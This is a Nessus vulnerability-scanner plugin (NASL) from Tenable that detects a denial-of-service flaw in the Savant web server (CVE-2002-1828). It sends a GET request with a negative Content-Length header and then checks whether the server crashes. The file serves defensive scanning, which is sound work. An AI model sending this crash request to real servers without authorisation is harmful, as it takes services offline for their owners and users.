#
# (C) Tenable Network Security, Inc.
#

########################
# References:
########################
#
# Date: Fri, 13 Sep 2002 19:55:05 +0000
# From "Auriemma Luigi" <aluigi@pivx.com>
# To: bugtraq@securityfocus.com
# Subject: Savant 3.1 multiple vulnerabilities
#
# See also:
# Date:  Sun, 22 Sep 2002 23:19:48 -0000
# From: "Bert Vanmanshoven" <sacrine@netric.org>
# To: bugtraq@securityfocus.com
# Subject: remote exploitable heap overflow in Null HTTPd 0.5.0
# 
########################
#
# Vulnerables:
# Null HTTPD 0.5.0
#


include("compat.inc");

if(description)
{
 script_id(11174);
 script_version("$Revision: 1.28 $");
 script_cve_id("CVE-2002-1828");
 script_bugtraq_id(5707, 6255);
 script_osvdb_id(16592);

 script_name(english:"Savant Web Server Malformed Content-Length DoS");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by a denial of service
vulnerability." );
 script_set_attribute(attribute:"description", value:
"The Savant web server on the remote host crashes when it receives an
invalid GET HTTP request with a negative Content-Length field.  A
remote attacker can leverage this issue to disable the affected
service." );
 #https://web.archive.org/web/20040917153922/http://archives.neohapsis.com/archives/bugtraq/2002-09/0151.html
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?4b6c826b");
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2002/11/27");
 script_set_attribute(attribute:"vuln_publication_date", value: "2002/09/14");
 script_cvs_date("$Date: 2016/12/14 20:22:11 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 
 script_summary(english:"Savant web server crashes if Content-Length is negative");
 script_category(ACT_DESTRUCTIVE_ATTACK);
 script_copyright(english:"This script is Copyright (C) 2002-2016 Tenable Network Security, Inc.");
 script_family(english:"Web Servers");
 script_dependencie("find_service1.nasl", "http_version.nasl");
 script_require_ports("Services/www",80);
 exit(0);
}

#

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);

if(http_is_dead(port:port))exit(0);

banner = get_http_banner(port:port);
if (! banner) exit(1, "No HTTP banner on port "+port);
if ("Savant/" >!< banner) exit(0, "The web server on port "+port+" is not Savant");

if(http_is_dead(port: port)) exit(1, "The web server on port "+port+" is dead");

# Savant attack
req = string("GET / HTTP/1.0\r\nContent-Length: -1\r\n\r\n");
w = http_send_recv_buf(port: port, data: req);

#
if(http_is_dead(port: port, retry: 3))
{
  security_warning(port);
}
